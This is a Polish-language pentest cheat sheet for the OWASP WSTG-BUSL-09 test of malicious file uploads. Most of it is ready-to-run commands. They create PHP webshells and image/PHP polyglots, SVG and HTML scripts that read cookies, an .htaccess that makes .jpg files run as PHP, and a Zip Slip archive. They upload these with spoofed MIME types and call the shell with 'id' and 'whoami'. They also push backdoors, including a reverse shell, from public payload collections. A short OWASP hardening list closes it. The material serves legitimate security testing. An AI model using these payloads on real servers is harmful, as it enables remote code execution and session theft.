# WSTG-BUSL-09 — Test Upload of Malicious Files

## Cele

- Przetestowac upload zlosliwych plikow
- Sprawdzic zabezpieczenia przed webshellami i malware

## KOMENDY

### Upload PHP webshell

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl -v -X POST TARGET/api/upload -F "file=@/tmp/shell.php;type=image/jpeg"

```

### Upload PHP webshell z MIME type bypass

```bash
curl -v -X POST TARGET/api/upload -F "file=@/tmp/shell.php;type=image/jpeg" -H "Content-Type: multipart/form-data"

```

### Upload polyglot (GIF + PHP)

```bash
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > /tmp/polyglot.php.gif
curl -v -X POST TARGET/api/upload -F "file=@/tmp/polyglot.php.gif;type=image/gif"

```

### Upload polyglot (JPEG + PHP)

```bash
printf '\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>' > /tmp/polyglot.php.jpg
curl -v -X POST TARGET/api/upload -F "file=@/tmp/polyglot.php.jpg;type=image/jpeg"

```

### Upload SVG z XSS

```bash
echo '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>' > /tmp/xss.svg
curl -v -X POST TARGET/api/upload -F "file=@/tmp/xss.svg;type=image/svg+xml"

```

### Upload HTML z JavaScript

```bash
echo '<html><body><script>alert(document.cookie)</script></body></html>' > /tmp/xss.html
curl -v -X POST TARGET/api/upload -F "file=@/tmp/xss.html;type=text/html"

```

### Upload .htaccess (Apache)

```bash
echo 'AddType application/x-httpd-php .jpg' > /tmp/.htaccess
curl -v -X POST TARGET/api/upload -F "file=@/tmp/.htaccess;type=text/plain"

```

### Upload web.config (IIS)

```bash
# Pozwala na wykonanie kodu ASP w plikach .jpg:
curl -v -X POST TARGET/api/upload -F "file=@/tmp/web.config;type=text/xml"

```

### Testowanie EICAR (antivirus test file)

```bash
curl -v -X POST TARGET/api/upload -F "file=@/tmp/eicar.txt;type=text/plain"

```

### Upload ZIP z path traversal (Zip Slip)

```bash
# Tworzy ZIP z plikiem ../../../tmp/evil.php
# python3 -c "import zipfile; z=zipfile.ZipFile('/tmp/evil.zip','w'); z.writestr('../../../tmp/evil.php','<?php system(\"id\");?>'); z.close()"
curl -v -X POST TARGET/api/upload -F "file=@/tmp/evil.zip;type=application/zip"

```

### Testowanie dostepu do przeslanego webshella

```bash
curl -v "TARGET/uploads/shell.php?cmd=id"
curl -v "TARGET/uploads/shell.php?cmd=whoami"

```

## KOMENDY Z WORDLISTAMI

### SecLists - PHP Web Shells

```bash
# Desktop/WSTG/SecLists-master/Web-Shells/PHP/obfuscated-phpshell.php
# Desktop/WSTG/SecLists-master/Web-Shells/PHP/another-obfuscated-phpshell.php
# Desktop/WSTG/SecLists-master/Web-Shells/PHP/Dysco.php
curl -v -X POST TARGET/api/upload -F "file=@Desktop/WSTG/SecLists-master/Web-Shells/PHP/obfuscated-phpshell.php;type=image/jpeg"

```

### SecLists - lista znanych webshelli

```bash
# Desktop/WSTG/SecLists-master/Web-Shells/backdoor_list.txt
# Referencja do sprawdzenia czy serwer blokuje znane sygnatury webshelli

```

### fuzzdb - PHP backdoors

```bash
# Desktop/WSTG/fuzzdb-master/web-backdoors/php/cmd.php
# Desktop/WSTG/fuzzdb-master/web-backdoors/php/shell.php
# Desktop/WSTG/fuzzdb-master/web-backdoors/php/php-backdoor.php
# Desktop/WSTG/fuzzdb-master/web-backdoors/php/php-reverse-shell.php
curl -v -X POST TARGET/api/upload -F "file=@Desktop/WSTG/fuzzdb-master/web-backdoors/php/cmd.php;type=image/jpeg"
curl -v -X POST TARGET/api/upload -F "file=@Desktop/WSTG/fuzzdb-master/web-backdoors/php/shell.php;type=image/jpeg"

```

### fuzzdb - JSP backdoors

```bash
# Desktop/WSTG/fuzzdb-master/web-backdoors/jsp/
curl -v -X POST TARGET/api/upload -F "file=@Desktop/WSTG/fuzzdb-master/web-backdoors/jsp/cmd.jsp;type=image/jpeg" 2>/dev/null

```

### fuzzdb - ASP backdoors

```bash
# Desktop/WSTG/fuzzdb-master/web-backdoors/asp/
curl -v -X POST TARGET/api/upload -F "file=@Desktop/WSTG/fuzzdb-master/web-backdoors/asp/cmd.asp;type=image/jpeg" 2>/dev/null

```

### PayloadsAllTheThings - Upload Insecure Files

```bash
# PHP shells: Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/Extension PHP/
# ASP shells: Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/Extension ASP/
# HTML shells: Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/Extension HTML/
curl -v -X POST TARGET/api/upload -F "file=@Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/Extension PHP/shell.php;type=image/jpeg"
curl -v -X POST TARGET/api/upload -F "file=@Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/Extension PHP/shell.phar;type=image/jpeg"

```

### PayloadsAllTheThings - EICAR test file

```bash
# Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/EICAR/

```

### PayloadsAllTheThings - ImageMagick exploit

```bash
# Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/Picture ImageMagick/

```

### PayloadsAllTheThings - Metadata payloads

```bash
# Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/Picture Metadata/

```

### XSS via uploaded files (PayloadsAllTheThings)

```bash
# SVG XSS: Desktop/WSTG/PayloadsAllTheThings-master/XSS Injection/Files/SVG_XSS1.svg
curl -v -X POST TARGET/api/upload -F "file=@Desktop/WSTG/PayloadsAllTheThings-master/XSS Injection/Files/SVG_XSS1.svg;type=image/svg+xml"

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. W Burp Suite -> Repeater: modyfikuj zawartosc pliku zachowujac magic bytes
2. Testuj polyglot files (prawidlowy obrazek z wbudowanym kodem)
3. Sprawdz czy serwer skanuje pliki antywirusem (upload EICAR test file)
4. Sprawdz czy przeslane pliki sa przechowywane poza webroot
5. Sprawdz czy przeslane pliki sa serwowane z innej domeny (CDN)
6. Testuj czy przeslane pliki zachowuja oryginalna nazwe (path traversal)
7. Sprawdz Content-Type odpowiedzi przy pobieraniu przeslanych plikow
8. Testuj czy mozna nadpisac istniejace pliki przez upload


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — File_Upload_Cheat_Sheet.md

- Waliduj przetwarzanie obrazow — re-enkoduj uploaded images aby usunac payloady
- Usun metadane (EXIF) z uploadowanych plikow
- Sandboxuj przetwarzanie plikow — izoluj procesy konwersji/parsowania
- Testuj upload plikow z podwojnymi rozszerzeniami (file.php.jpg) i null bytes (file.php%00.jpg)

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| Upload Scanner | Testy bezpieczenstwa uploadu z roznymi payloadami | [GitHub](https://github.com/modzero/mod0BurpUploadScanner) |
